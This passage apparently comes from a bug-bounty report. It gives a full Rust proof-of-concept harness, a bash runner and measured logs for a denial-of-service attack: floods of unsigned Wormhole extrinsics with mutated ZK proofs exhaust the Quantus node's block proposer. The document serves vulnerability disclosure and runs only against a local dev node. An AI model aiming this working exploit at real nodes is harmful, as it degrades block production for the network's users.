	let fixture_path = PathBuf::from(args.next().unwrap_or_else(|| {
		"pallets/wormhole/test-data/public_batch.hex".into()
	}));
	let mode = Mode::parse(&args.next().unwrap_or_else(|| "public".into()));
	let variants: usize = args
		.next()
		.unwrap_or_else(|| DEFAULT_VARIANTS.to_string())
		.parse()
		.expect("variants");
	let attack_seconds: u64 = args
		.next()
		.unwrap_or_else(|| DEFAULT_ATTACK_SECONDS.to_string())
		.parse()
		.expect("attack seconds");
	let refill_interval: u64 = args
		.next()
		.unwrap_or_else(|| DEFAULT_REFILL_INTERVAL_SECONDS.to_string())
		.parse()
		.expect("refill interval");
	let threads: usize = args
		.next()
		.unwrap_or_else(|| DEFAULT_THREADS.to_string())
		.parse()
		.expect("threads");
	assert!(variants > 0 && threads > 0);
	let wave_count = (attack_seconds / refill_interval.max(1)) + 1;
	let node_log = std::env::var("NODE_LOG_PATH").ok().map(PathBuf::from);
	let node_pid: Option<u32> = std::env::var("NODE_PID").ok().and_then(|s| s.parse().ok());
	let log_start = node_log.as_ref().and_then(|path| fs::metadata(path).ok()).map(|m| m.len()).unwrap_or(0);

	let leaves = pallet_wormhole::circuit_config::NUM_LEAF_PROOFS;
	let inner = pallet_wormhole::circuit_config::NUM_PRIVATE_BATCH_PROOFS;
	let zk_ps = mode.zk_ref_time_ps();
	let normal_ref_time = RUNTIME_MAX_BLOCK_REF_TIME * NORMAL_DISPATCH_PERCENT / 100;
	let normal_block_length = RUNTIME_MAX_BLOCK_LENGTH as u64 * NORMAL_DISPATCH_PERCENT / 100;

	println!("========== WORMHOLE PROPOSER-STAGE E2E PoC ==========");
	println!("PRIVATE_NETWORK_ONLY=true");
	println!("RPC=http://{}:{}", rpc.host, rpc.port);
	println!("MODE={}", mode.label());
	println!("FIXTURE={}", fixture_path.display());
	println!("VARIANTS_PER_REFILL={variants}");
	println!("ATTACK_SECONDS={attack_seconds}");
	println!("REFILL_INTERVAL_SECONDS={refill_interval}");
	println!("SUBMIT_THREADS={threads}");
	println!("ATTACK_WAVE_COUNT={wave_count}");
	println!("NODE_LOG_PATH={}", node_log.as_ref().map(|p| p.display().to_string()).unwrap_or_else(|| "unset".into()));
	println!("NODE_PID={}", node_pid.map(|p| p.to_string()).unwrap_or_else(|| "unset".into()));
	println!("PRODUCTION_CALL_PATH=author_submitExtrinsic -> submit_one -> Executive::validate_transaction -> Wormhole::validate_unsigned -> pool import notification -> QPoW proposer -> BlockBuilder::push -> Executive::apply_extrinsic -> UncheckedExtrinsic::apply -> Wormhole::pre_dispatch -> full ZK verifier");
	println!("EXPECTED_REJECT_LOG={}", mode.reject_log());

	println!("CONFIG_QPOW_BUILD_TIME_SECS={QPOW_BUILD_TIME_SECS}");
	println!("CONFIG_PROPOSER_HARD_DEADLINE_MS={PROPOSER_HARD_DEADLINE_MS}");
	println!("CONFIG_PROPOSER_BLOCK_SIZE_LIMIT={PROPOSER_BLOCK_SIZE_LIMIT}");
	println!("CONFIG_RUNTIME_MAX_BLOCK_LENGTH={RUNTIME_MAX_BLOCK_LENGTH}");
	println!("CONFIG_NORMAL_BLOCK_LENGTH={normal_block_length}");
	println!("CONFIG_RUNTIME_MAX_BLOCK_REF_TIME_PS={RUNTIME_MAX_BLOCK_REF_TIME}");
	println!("CONFIG_NORMAL_DISPATCH_REF_TIME_PS={normal_ref_time}");
	println!("CONFIG_ZK_VERIFY_REF_TIME_PS={zk_ps}");
	println!("CONFIG_POOL_LIMIT={POOL_LIMIT}");
	println!("CONFIG_POOL_KBYTES={POOL_KBYTES}");
	println!("CONFIG_MAX_SKIPPED_TRANSACTIONS={MAX_SKIPPED_TRANSACTIONS}");
	println!("CONFIG_UNSIGNED_EXIT_PRIORITY={UNSIGNED_EXIT_PRIORITY}");
	println!("CONFIG_NUM_LEAF_PROOFS={leaves}");
	println!("CONFIG_NUM_PRIVATE_BATCH_PROOFS={inner}");

	let fixture_text = fs::read_to_string(&fixture_path).expect("fixture file");
	let fixture = hex::decode(fixture_text.trim()).expect("fixture hex");
	let base = proof_from_fixture(mode, &fixture);
	assert_eq!(base.to_bytes(), fixture, "fixture must already be canonical");
	println!("FIXTURE_BYTES={}", fixture.len());
	println!("FIXTURE_PUBLIC_INPUTS={}", base.public_inputs.len());
	println!("VERIFIER_EMBEDDED=true");

	let chain = rpc.call("system_chain", json!([])).expect("system_chain").as_str().unwrap_or("unknown").to_string();
	let genesis = genesis_hash(&rpc);
	let (start_block, start_hash) = best(&rpc);
	println!("CHAIN={chain}");
	println!("GENESIS_HASH={}", hex_bytes(genesis.as_bytes()));
	println!("START_BLOCK={start_block}");
	println!("START_HASH={}", hex_bytes(start_hash.as_bytes()));
	println!("ALICE_ACCOUNT={}", account_hex(&Dilithium87Pair::from_seed_slice(&[0u8; 32]).expect("Alice seed")));
	println!("ATTACKER_AUTHORITY=none");
	println!("ATTACKER_BALANCE_REQUIRED=0");
	println!("ATTACKER_SIGNATURE_REQUIRED=0");
	println!("ATTACKER_FEE_PAID=0");
	println!("ATTACKER_PAYS=No");
	println!("ALICE_FREE_BEFORE={:?}", alice_free_balance(&rpc));
	if let Some(pid) = node_pid {
		println!("CPU_BEFORE={:?}", sample_cpu(pid));
	}

	println!("PHASE=baseline_block_production START");
	let baseline_samples = block_samples(&rpc, Duration::from_secs(8));
	println!("BASELINE_BLOCK_SAMPLES={baseline_samples:?}");
	assert!(!baseline_samples.is_empty(), "local authority did not produce a baseline block");
	println!("PHASE=baseline_block_production END");

	println!("PHASE=warmup_honest_transaction START");
	let (_warmup_block, warmup_inclusion) =
		submit_and_observe(&rpc, genesis, 0, "WARMUP", Duration::from_secs(120));
	assert!(warmup_inclusion.is_some(), "warmup transfer was not included");
	println!("PHASE=warmup_honest_transaction END");

	println!("PHASE=steady_honest_transaction START");
	let (_steady_submit_block, steady_inclusion) =
		submit_and_observe(&rpc, genesis, 1, "STEADY", Duration::from_secs(90));
	assert!(steady_inclusion.is_some(), "steady-state transfer was not included");
	let steady_delay_ms = steady_inclusion.map(|(_, _, d)| d.as_millis()).unwrap_or(0);
	println!("PHASE=steady_honest_transaction END");

	let occupancy_before = pool_occupancy(&rpc);
	print_occupancy("POOL_BEFORE_ATTACK", &occupancy_before);
	if let Some(pid) = node_pid {
		println!("CPU_PRE_ATTACK={:?}", sample_cpu(pid));
	}

	let (attack_start_block, attack_start_hash) = best(&rpc);
	let good_candidate_bytes =
		mutate_public_inputs(mode, &base, attack_start_block, attack_start_hash, 1, false);
	let good_candidate = bare_extrinsic(mode, good_candidate_bytes);
	let candidate_len = good_candidate.len();
	let max_fit_by_proposer_size = PROPOSER_BLOCK_SIZE_LIMIT / candidate_len.max(1);
	let max_fit_by_normal_length = (normal_block_length as usize) / candidate_len.max(1);
	let max_fit_by_zk_weight = (normal_ref_time / zk_ps.max(1)) as usize;
	println!("ATTACK_START_BLOCK={attack_start_block}");
	println!("ATTACK_START_HASH={}", hex_bytes(attack_start_hash.as_bytes()));
	println!("MUTATED_CANDIDATE_BYTES={candidate_len}");
	println!("MUTATED_CANDIDATE_HASH={}", hex_bytes(tx_hash(&good_candidate).as_bytes()));
	println!("LIMIT_MAX_INCLUDED_BY_PROPOSER_SIZE={max_fit_by_proposer_size}");
	println!("LIMIT_MAX_INCLUDED_BY_NORMAL_LENGTH={max_fit_by_normal_length}");
	println!("LIMIT_MAX_CHARGED_BY_ZK_WEIGHT={max_fit_by_zk_weight}");

	println!("PHASE=negative_control_duplicate_nullifier START");
	let duplicate_tx = bare_extrinsic(
		mode,
		mutate_public_inputs(mode, &base, attack_start_block, attack_start_hash, 99, true),
	);
	let duplicate_result = submit(&rpc, &duplicate_tx);
	println!("NEGATIVE_CONTROL_DUPLICATE_NULLIFIER_RESULT={duplicate_result:?}");
	assert!(duplicate_result.is_err(), "cheap duplicate-nullifier guard unexpectedly admitted input");
	println!("PHASE=negative_control_duplicate_nullifier END");

	println!("PHASE=attack START unix_ms={}", now_ms());
	let probe_hash = submit(&rpc, &good_candidate).expect("fresh-nullifier candidate did not pass pool admission");
	println!("ATTACK_PROBE_SUBMIT_RESULT=Ok({probe_hash:?})");
	let occupancy_after_probe = pool_occupancy(&rpc);
	print_occupancy("ATTACK_PROBE", &occupancy_after_probe);
	assert!(
		matches!(occupancy_after_probe, PoolOccupancy::Count(c) if c >= 1)
			|| matches!(occupancy_after_probe, PoolOccupancy::RpcError(_)),
		"probe was accepted but pool occupancy could not be observed"
	);

	let stop = Arc::new(AtomicBool::new(false));
	let next_variant = Arc::new(AtomicU64::new(2));
	let wave_limit = Arc::new(AtomicU64::new((variants + 1) as u64));
	let submitted = Arc::new(AtomicU64::new(0));
	let accepted = Arc::new(AtomicU64::new(0));
	let rejected = Arc::new(AtomicU64::new(0));
	let total_rpc_ms = Arc::new(AtomicU64::new(0));
	let accepted_hashes = Arc::new(Mutex::new(vec![probe_hash.clone()]));
	let attack_started = Instant::now();
	let deadline = attack_started + Duration::from_secs(attack_seconds);
	let mut workers = Vec::new();
	for worker_id in 0..threads {
		let rpc = rpc.clone();
		let base = base.clone();
		let stop = Arc::clone(&stop);
		let next_variant = Arc::clone(&next_variant);
		let wave_limit = Arc::clone(&wave_limit);
		let submitted = Arc::clone(&submitted);
		let accepted = Arc::clone(&accepted);
		let rejected = Arc::clone(&rejected);
		let total_rpc_ms = Arc::clone(&total_rpc_ms);
		let accepted_hashes = Arc::clone(&accepted_hashes);
		workers.push(thread::spawn(move || {
			while !stop.load(Ordering::Relaxed) && Instant::now() < deadline {
				let variant_id = loop {
					if stop.load(Ordering::Relaxed) || Instant::now() >= deadline {
						return;
					}
					let current = next_variant.load(Ordering::Relaxed);
					if current > wave_limit.load(Ordering::Acquire) {
						thread::sleep(Duration::from_millis(20));
						continue;
					}
					if next_variant
						.compare_exchange(current, current + 1, Ordering::AcqRel, Ordering::Relaxed)
						.is_ok()
					{
						break current;
					}
				};
				let extrinsic = bare_extrinsic(
					mode,
					mutate_public_inputs(
						mode,
						&base,
						attack_start_block,
						attack_start_hash,
						variant_id,
						false,
					),
				);
				let started = Instant::now();
				let result = submit(&rpc, &extrinsic);
				total_rpc_ms.fetch_add(started.elapsed().as_millis() as u64, Ordering::Relaxed);
				submitted.fetch_add(1, Ordering::Relaxed);
				let accepted_now = result.is_ok();
				match result {
					Ok(hash) => {
						accepted.fetch_add(1, Ordering::Relaxed);
						if let Ok(mut hashes) = accepted_hashes.lock() {
							if hashes.len() < 8 {
								hashes.push(hash);
							}
						}
					},
					Err(_) => {
						rejected.fetch_add(1, Ordering::Relaxed);
					},
				}
				if variant_id % 50 == worker_id as u64 {
					println!(
						"ATTACK_SUBMIT_PROGRESS variant={} result={} tx_bytes={}",
						variant_id,
						if accepted_now { "accepted" } else { "rejected" },
						extrinsic.len()
					);
				}
			}
		}));
	}

	let refill_stop = Arc::clone(&stop);
	let refill_limit = Arc::clone(&wave_limit);
	let refill_rpc = rpc.clone();
	let refill = thread::spawn(move || {
		for wave in 0..wave_count {
			let wave_at = attack_started + Duration::from_secs(wave * refill_interval);
			while !refill_stop.load(Ordering::Relaxed) && Instant::now() < wave_at {
				thread::sleep(Duration::from_millis(50));
			}
			if refill_stop.load(Ordering::Relaxed) || Instant::now() >= deadline {
				break;
			}
			if wave > 0 {
				let inclusive_end = 1 + ((wave as usize + 1) * variants) as u64;
				refill_limit.store(inclusive_end, Ordering::Release);
				println!(
					"ATTACK_REFILL_WAVE wave={} t={:.1}s variant_range={}..={} occupancy={:?}",
					wave + 1,
					attack_started.elapsed().as_secs_f64(),
					2 + (wave as usize * variants),
					inclusive_end,
					pool_occupancy(&refill_rpc),
				);
			}
		}
	});

	let control_rpc = rpc.clone();
	let accepted_for_control = Arc::clone(&accepted);
	let stop_for_control = Arc::clone(&stop);
	let control_handle = thread::spawn(move || {
		let wait_started = Instant::now();
		while wait_started.elapsed() < Duration::from_secs(20) && !stop_for_control.load(Ordering::Relaxed) {
			let occupancy = pool_occupancy(&control_rpc);
			let accepted_now = accepted_for_control.load(Ordering::Relaxed);
			if occupancy_busy(&occupancy, variants.min(50).max(8)) || accepted_now >= variants as u64 / 4 {
				println!("CONTROL_TRIGGER occupancy={occupancy:?} accepted={accepted_now}");
				return submit_and_observe(
					&control_rpc,
					genesis,
					2,
					"CONTROL",
					Duration::from_secs(90),
				);
			}
			thread::sleep(Duration::from_millis(200));
		}
		println!("CONTROL_TRIGGER=timeout_fallback");
		submit_and_observe(&control_rpc, genesis, 2, "CONTROL", Duration::from_secs(90))
	});

	let mut last_metric = Instant::now();
	let mut last_block = attack_start_block;
	let mut peak_cpu: f32 = 0.0;
	while attack_started.elapsed() < Duration::from_secs(attack_seconds) {
		thread::sleep(Duration::from_secs(1));
		let (block, _) = best(&rpc);
		if block != last_block {
			println!(
				"ATTACK_BLOCK_ADVANCE t={:.1}s block={} delta={}",
				attack_started.elapsed().as_secs_f64(),
				block,
				block - last_block
			);
			last_block = block;
		}
		if last_metric.elapsed() >= Duration::from_secs(2) {
			let n = submitted.load(Ordering::Relaxed);
			let occupancy = pool_occupancy(&rpc);
			if let Some(pid) = node_pid {
				if let Some(cpu) = sample_cpu(pid) {
					peak_cpu = peak_cpu.max(cpu);
					println!("ATTACK_CPU t={:.1}s cpu={cpu}", attack_started.elapsed().as_secs_f64());
				}
			}
			println!(
				"ATTACK_METRIC t={:.1}s submitted={} accepted={} rejected={} submit_rate={:.1}/s occupancy={:?} mean_rpc_ms={:.2}",
				attack_started.elapsed().as_secs_f64(),
				n,
				accepted.load(Ordering::Relaxed),
				rejected.load(Ordering::Relaxed),
				n as f64 / attack_started.elapsed().as_secs_f64().max(0.001),
				occupancy,
				total_rpc_ms.load(Ordering::Relaxed) as f64 / n.max(1) as f64,
			);
			last_metric = Instant::now();
		}
	}
	stop.store(true, Ordering::Relaxed);
	for worker in workers {
		worker.join().expect("attack worker");
	}
	refill.join().expect("refill worker");
	let (_control_submit_block, control_inclusion) = control_handle.join().expect("control observer");
	println!("PHASE=attack END unix_ms={}", now_ms());

	let total_submitted = submitted.load(Ordering::Relaxed);
	let total_accepted = accepted.load(Ordering::Relaxed) + 1;
	let total_rejected = rejected.load(Ordering::Relaxed);
	let occupancy_after = pool_occupancy(&rpc);
	print_occupancy("POOL_AFTER_ATTACK", &occupancy_after);
	println!("ATTACK_TOTAL_SUBMITTED={total_submitted}");
	println!("ATTACK_TOTAL_ACCEPTED={total_accepted}");
	println!("ATTACK_TOTAL_REJECTED={total_rejected}");
	println!("ATTACK_TOTAL_BYTES_SUBMITTED={}", total_submitted.saturating_add(1) * candidate_len as u64);
	println!("ATTACK_MEAN_RPC_MS={:.2}", total_rpc_ms.load(Ordering::Relaxed) as f64 / total_submitted.max(1) as f64);
	println!("ATTACK_PEAK_CPU={peak_cpu}");
	if let Some(pid) = node_pid {
		println!("CPU_AFTER_ATTACK={:?}", sample_cpu(pid));
	}

	println!("PHASE=recovery START");
	let recovery_samples = block_samples(&rpc, Duration::from_secs(15));
	println!("RECOVERY_BLOCK_SAMPLES={recovery_samples:?}");
	println!("PHASE=recovery END");

	println!("PHASE=recovery_honest_transaction START");
	let (_recovery_submit, recovery_inclusion) =
		submit_and_observe(&rpc, genesis, 3, "RECOVERY", Duration::from_secs(90));
	println!("PHASE=recovery_honest_transaction END");

	let hashes = accepted_hashes.lock().unwrap().clone();
	println!("ACCEPTED_SAMPLE_HASHES={hashes:?}");
	let (final_block, _) = best(&rpc);
	let mut included_attack_candidates = 0usize;
	for number in 0..=final_block {
		for hash in &hashes {
			if in_block(&rpc, hash, number).is_some() {
				included_attack_candidates += 1;
			}
		}
	}
	println!("ATTACK_CANDIDATES_INCLUDED_IN_CHAIN={included_attack_candidates}");
	println!("ALICE_FREE_AFTER={:?}", alice_free_balance(&rpc));

	if let Some(path) = node_log.as_ref() {
		let (proposals, total_failures, invalid_tx_logs) = parse_node_log(path, log_start, mode);
		println!("NODE_LOG_VERIFIER_FAILURES={total_failures}");
		println!("NODE_LOG_INVALID_TRANSACTION_LINES={invalid_tx_logs}");
		let mut max_failures = 0usize;
		let mut max_took = 0u64;
		let mut hit_deadline = 0usize;
		for (idx, sample) in proposals.iter().enumerate() {
			if sample.verifier_failures > 0 || sample.took_ms >= 100 {
				let bytes = sample.verifier_failures.saturating_mul(candidate_len);
				let zk_ps_used = sample.verifier_failures as u64 * zk_ps;
				println!(
					"PROPOSAL_SAMPLE idx={idx} height={} took_ms={} end={} extrinsics={} verifier_failures={} processed_bytes={} zk_ref_time_ps={} exceeds_block_size={} exceeds_zk_weight={} exceeds_skip_cap={} exceeds_deadline={}",
					sample.height,
					sample.took_ms,
					sample.end_reason,
					sample.extrinsics,
					sample.verifier_failures,
					bytes,
					zk_ps_used,
					bytes > PROPOSER_BLOCK_SIZE_LIMIT,
					zk_ps_used > normal_ref_time,
					sample.verifier_failures > MAX_SKIPPED_TRANSACTIONS,
					sample.end_reason == "HitDeadline" || sample.took_ms >= PROPOSER_HARD_DEADLINE_MS,
				);
			}
			max_failures = max_failures.max(sample.verifier_failures);
			max_took = max_took.max(sample.took_ms);
			if sample.end_reason == "HitDeadline" || sample.took_ms >= PROPOSER_HARD_DEADLINE_MS {
				hit_deadline += 1;
			}
		}
		let max_bytes = max_failures.saturating_mul(candidate_len);
		let max_zk = max_failures as u64 * zk_ps;
		println!("IMPACT_MAX_PROPOSAL_TOOK_MS={max_took}");
		println!("IMPACT_MAX_PROPOSAL_VERIFIER_FAILURES={max_failures}");
		println!("IMPACT_MAX_PROPOSAL_PROCESSED_BYTES={max_bytes}");
		println!("IMPACT_MAX_PROPOSAL_ZK_REF_TIME_PS={max_zk}");
		println!("IMPACT_EXCEEDS_PROPOSER_BLOCK_SIZE={}", max_bytes > PROPOSER_BLOCK_SIZE_LIMIT);
		println!("IMPACT_EXCEEDS_NORMAL_BLOCK_LENGTH={}", max_bytes as u64 > normal_block_length);
		println!("IMPACT_EXCEEDS_NORMAL_ZK_WEIGHT={}", max_zk > normal_ref_time);
		println!("IMPACT_EXCEEDS_MAX_BLOCK_ZK_WEIGHT={}", max_zk > RUNTIME_MAX_BLOCK_REF_TIME);
		println!("IMPACT_EXCEEDS_SKIP_CAP={}", max_failures > MAX_SKIPPED_TRANSACTIONS);
		println!("IMPACT_HIT_DEADLINE_COUNT={hit_deadline}");
		println!(
			"IMPACT_PROCESSED_VS_SIZE_LIMIT_RATIO={:.2}",
			max_bytes as f64 / PROPOSER_BLOCK_SIZE_LIMIT.max(1) as f64
		);
		println!(
			"IMPACT_PROCESSED_VS_INCLUDED_SIZE_CAP={:.2}",
			max_failures as f64 / max_fit_by_proposer_size.max(1) as f64
		);
		assert!(total_failures > 0, "node log did not record full ZK verifier failures");
		assert!(
			max_bytes > PROPOSER_BLOCK_SIZE_LIMIT || max_failures > MAX_SKIPPED_TRANSACTIONS,
			"did not observe processing beyond the proposer size or skip-cap parameters"
		);
	} else {
		println!("NODE_LOG_PATH_MISSING=true");
	}

	let control_delay_ms = control_inclusion.map(|(_, _, d)| d.as_millis()).unwrap_or(0);
	println!("COMPARE_STEADY_DELAY_MS={steady_delay_ms}");
	println!("COMPARE_CONTROL_DELAY_MS={control_delay_ms}");
	println!("COMPARE_RECOVERY_DELAY_MS={}", recovery_inclusion.map(|(_, _, d)| d.as_millis()).unwrap_or(0));
	println!("COMPARE_CONTROL_SLOWER_THAN_STEADY={}", control_delay_ms > steady_delay_ms);
	println!("LOSS_MODEL=attacker_spends_only_local_CPU_and_loopback_bandWIDTH;_no_protocol_funds_are_stolen");
	println!("DEMONSTRATED_LOSS=unauthenticated_unsigned_candidates_are_accepted_into_the_pool_and_force_proposer_ZK_verification_beyond_configured_block_size_weight_or_skip_limits");
	println!("STRONGER_CLAIM_STATUS=do_not_claim_theft_fund_freeze_or_total_network_shutdown");
	assert!(total_accepted > 0, "no unsigned candidates were accepted");
	assert_eq!(included_attack_candidates, 0, "invalid attack candidates must not be included");
}
```

#### `node/scripts/run_wormhole_proposer_poc.sh`

Paste this file exactly, then `chmod +x`.

```bash
#!/usr/bin/env bash
set -euo pipefail

# Private-node-only E2E runner for the Wormhole unsigned proposer-exhaustion PoC.
# Starts a fresh loopback `quantus-node --dev` and never talks to a public network.

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
CHAIN_ROOT="${CHAIN_ROOT:-$(cd "$SCRIPT_DIR/../.." && pwd)}"
NODE_BIN="${NODE_BIN:-$CHAIN_ROOT/target/release/quantus-node}"
POC_BIN="${POC_BIN:-$CHAIN_ROOT/target/release/wormhole_proposer_e2e}"
FIXTURE="${FIXTURE:-$CHAIN_ROOT/pallets/wormhole/test-data/public_batch.hex}"
RPC_PORT="${RPC_PORT:-19945}"
P2P_PORT="${P2P_PORT:-30345}"
PROM_PORT="${PROM_PORT:-19616}"
MODE="${MODE:-public}"
VARIANTS="${VARIANTS:-500}"
ATTACK_SECONDS="${ATTACK_SECONDS:-24}"
REFILL_INTERVAL="${REFILL_INTERVAL:-8}"
THREADS="${THREADS:-16}"

ARTIFACT_ROOT="${ARTIFACT_ROOT:-$CHAIN_ROOT/../poc-artifacts/wormhole-proposer}"
RUN_ID="$(date -u +%Y%m%dT%H%M%SZ)-pid$$"
RUN_DIR="$ARTIFACT_ROOT/runs/$RUN_ID"
mkdir -p "$RUN_DIR"

if [[ ! -x "$NODE_BIN" ]]; then
	echo "missing executable: $NODE_BIN" >&2
	exit 1
fi
if [[ ! -x "$POC_BIN" ]]; then
	echo "missing executable: $POC_BIN" >&2
	exit 1
fi
if [[ ! -f "$FIXTURE" ]]; then
	echo "missing fixture: $FIXTURE" >&2
	exit 1
fi

RPC_URL="http://127.0.0.1:$RPC_PORT"
NODE_PID=""
CPU_PID=""
cleanup() {
	if [[ -n "${CPU_PID:-}" ]]; then kill "$CPU_PID" 2>/dev/null || true; fi
	if [[ -n "${NODE_PID:-}" ]]; then kill "$NODE_PID" 2>/dev/null || true; fi
	if [[ -n "${NODE_PID:-}" ]]; then wait "$NODE_PID" 2>/dev/null || true; fi
}
trap cleanup EXIT INT TERM

{
	echo "RUN_DIR=$RUN_DIR"
	echo "CHAIN_ROOT=$CHAIN_ROOT"
	echo "NODE_BIN=$NODE_BIN"
	echo "POC_BIN=$POC_BIN"
	echo "RPC_URL=$RPC_URL"
	echo "FIXTURE=$FIXTURE"
	echo "MODE=$MODE"
	echo "VARIANTS=$VARIANTS"
	echo "ATTACK_SECONDS=$ATTACK_SECONDS"
	echo "REFILL_INTERVAL=$REFILL_INTERVAL"
	echo "THREADS=$THREADS"
	echo "PRIVATE_NETWORK_ONLY=true"
} | tee "$RUN_DIR/command.log"

export NODE_LOG_PATH="$RUN_DIR/node.log"
"$NODE_BIN" --dev \
	--tmp \
	--rpc-port "$RPC_PORT" \
	--port "$P2P_PORT" \
	--prometheus-port "$PROM_PORT" \
	--rpc-methods Unsafe \
	--rpc-cors all \
	--no-telemetry \
	-lsc_basic_authorship=debug \
	-lsc_consensus_qpow=debug \
	-lruntime::wormhole=debug \
	>"$NODE_LOG_PATH" 2>&1 &
NODE_PID=$!
export NODE_PID
echo "NODE_PID=$NODE_PID" | tee -a "$RUN_DIR/command.log"
echo "NODE_LOG_PATH=$NODE_LOG_PATH" | tee -a "$RUN_DIR/command.log"

for attempt in $(seq 1 90); do
	if curl -fsS --max-time 2 -X POST "$RPC_URL" \
		-H 'Content-Type: application/json' \
		--data '{"jsonrpc":"2.0","id":1,"method":"chain_getHeader","params":[]}' \
		>"$RUN_DIR/readiness-$attempt.json" 2>/dev/null; then
		echo "RPC_READY_ATTEMPT=$attempt" | tee -a "$RUN_DIR/command.log"
		break
	fi
	if ! kill -0 "$NODE_PID" 2>/dev/null; then
		echo "node exited before RPC became ready" >&2
		tail -n 80 "$NODE_LOG_PATH" >&2 || true
		exit 1
	fi
	sleep 1
done

if ! curl -fsS --max-time 2 -X POST "$RPC_URL" \
	-H 'Content-Type: application/json' \
	--data '{"jsonrpc":"2.0","id":1,"method":"chain_getHeader","params":[]}' \
	>"$RUN_DIR/readiness-final.json" 2>/dev/null; then
	echo "RPC did not become ready" >&2
	tail -n 80 "$NODE_LOG_PATH" >&2 || true
	exit 1
fi

(
	while kill -0 "$NODE_PID" 2>/dev/null; do
		date -u +%Y-%m-%dT%H:%M:%SZ
		ps -p "$NODE_PID" -o pid=,ppid=,pcpu=,pmem=,rss=,etime=,command=
		sleep 1
	done
) >"$RUN_DIR/cpu.log" 2>&1 &
CPU_PID=$!

{
	echo "START_UTC=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
	"$POC_BIN" "$RPC_URL" "$FIXTURE" "$MODE" "$VARIANTS" "$ATTACK_SECONDS" "$REFILL_INTERVAL" "$THREADS"
	echo "END_UTC=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
} | tee "$RUN_DIR/poc.log"

echo "RUN_ARTIFACTS=$RUN_DIR"
echo "===== SCOREBOARD ====="
rg -n 'ATTACK_TOTAL_|IMPACT_|COMPARE_|CONTROL_|STEADY_|POOL_|NEGATIVE_|NODE_LOG_VERIFIER|ATTACK_CANDIDATES' "$RUN_DIR/poc.log" || true
echo "Prepared-block lines:"
rg -n 'Prepared block for proposing' "$RUN_DIR/node.log" | head -n 40 || true
echo "Verifier-failure count:"
rg -c 'proof verification failed' "$RUN_DIR/node.log" || true
```

### How to run

{% stepper %}
{% step %}

## Clone and check out the target revision

```sh
git clone https://github.com/immunefi-team/audit-comp-quantus-chain.git quantus-poc-chain
cd quantus-poc-chain
git checkout 3b243b870a5442a6e5f443056f67bbba87d472f5
```

{% endstep %}

{% step %}

## Add the dependencies and PoC files

Add the `Cargo.toml` lines and the two files from the Full PoC source section.
{% endstep %}

{% step %}

## Configure `libclang` on macOS

```sh
export LIBCLANG_PATH=/opt/homebrew/opt/llvm@21/lib
```

Omit on Linux if `libclang` is visible.
{% endstep %}

{% step %}

## Build the node and PoC binary

```sh
cargo build --release -p quantus-node --bin quantus-node
cargo build --release -p quantus-node --bin wormhole_proposer_e2e
```

{% endstep %}

{% step %}

## Run the PoC

```sh
chmod +x node/scripts/run_wormhole_proposer_poc.sh
./node/scripts/run_wormhole_proposer_poc.sh
```

{% endstep %}
{% endstepper %}

Success (numbers can move with CPU; inequalities must hold): duplicate-nullifier control is `Invalid Transaction`; `ATTACK_TOTAL_REJECTED=0` and `ATTACK_TOTAL_ACCEPTED` is in the thousands (measured 1501); `NODE_LOG_VERIFIER_FAILURES` matches accepted; `IMPACT_EXCEEDS_PROPOSER_BLOCK_SIZE=true`, `IMPACT_EXCEEDS_NORMAL_ZK_WEIGHT=true`, `IMPACT_EXCEEDS_SKIP_CAP=true`; `ATTACK_CANDIDATES_INCLUDED_IN_CHAIN=0`; control delay > steady delay; node log shows `Prepared block for proposing at ... (29xx ms)` during the attack vs `(0 ms)`/`(1 ms)` idle. Blocks still advance.

### Measured-run excerpts

Revision `3b243b870a5442a6e5f443056f67bbba87d472f5`. Public batch, 500 variants/wave, 24 s attack. Full `poc.log` / `node.log` are attached.

The final blocks themselves do not exceed the block-size limit, because the invalid transactions are not included (`extrinsics_count` stays 1–2). The proposer still processed candidate bytes and verification work 26.66× the 4,194,816-byte size limit, over the 4.5 s / 6.0 s ZK weight caps, and over the skip cap of 8. `IMPACT_EXCEEDS_PROPOSER_BLOCK_SIZE=true` compares processed candidate bytes against `DEFAULT_BLOCK_SIZE_LIMIT`; it does not mean the emitted block exceeded that limit.

#### Harness (`poc.log`)

```
PRODUCTION_CALL_PATH=author_submitExtrinsic -> Executive::validate_transaction -> Wormhole::validate_unsigned -> QPoW proposer -> BlockBuilder::push -> Wormhole::pre_dispatch -> full ZK verifier
NEGATIVE_CONTROL_DUPLICATE_NULLIFIER_RESULT=Err("Invalid Transaction")
ATTACK_TOTAL_SUBMITTED=1500
ATTACK_TOTAL_ACCEPTED=1501
ATTACK_TOTAL_REJECTED=0
POOL_OCCUPANCY=RpcError("Exceeded max limit of 15728640")
ATTACK_CANDIDATES_INCLUDED_IN_CHAIN=0
NODE_LOG_VERIFIER_FAILURES=1501
PROPOSAL_SAMPLE idx=9 height=4 took_ms=2951 extrinsics=2 verifier_failures=500 processed_bytes=111813500 exceeds_block_size=true exceeds_zk_weight=true exceeds_skip_cap=true
PROPOSAL_SAMPLE idx=13 height=5 took_ms=2946 extrinsics=1 verifier_failures=499 processed_bytes=111589873 exceeds_block_size=true exceeds_zk_weight=true exceeds_skip_cap=true
PROPOSAL_SAMPLE idx=15 height=6 took_ms=2955 extrinsics=1 verifier_failures=498 processed_bytes=111366246 exceeds_block_size=true exceeds_zk_weight=true exceeds_skip_cap=true
IMPACT_MAX_PROPOSAL_PROCESSED_BYTES=111813500
IMPACT_EXCEEDS_PROPOSER_BLOCK_SIZE=true
IMPACT_EXCEEDS_NORMAL_ZK_WEIGHT=true
IMPACT_EXCEEDS_SKIP_CAP=true
IMPACT_PROCESSED_VS_SIZE_LIMIT_RATIO=26.66
COMPARE_STEADY_DELAY_MS=2660
COMPARE_CONTROL_DELAY_MS=6950
```

#### Node log (`node.log`)

1,501 identical `Public-batch proof verification failed` lines omitted. Idle proposals 0–2 ms; attack proposals 2,951 / 2,946 / 2,955 ms; `extrinsics_count` stays 1–2 because invalid txs are not included.

```
# idle
🎁 Prepared block for proposing at 1 (1 ms) ... extrinsics_count: 1
# first failed pre_dispatch; candidate not included
ERROR pallet_wormhole::pallet: Public-batch proof verification failed
🎁 Prepared block for proposing at 4 (11 ms) ... extrinsics_count: 1
# attack proposals (verifier ERROR repeats ~500x each, omitted)
🎁 Prepared block for proposing at 4 (2951 ms) ... extrinsics_count: 2
🎁 Prepared block for proposing at 5 (2946 ms) ... extrinsics_count: 1
🎁 Prepared block for proposing at 6 (2955 ms) ... extrinsics_count: 1
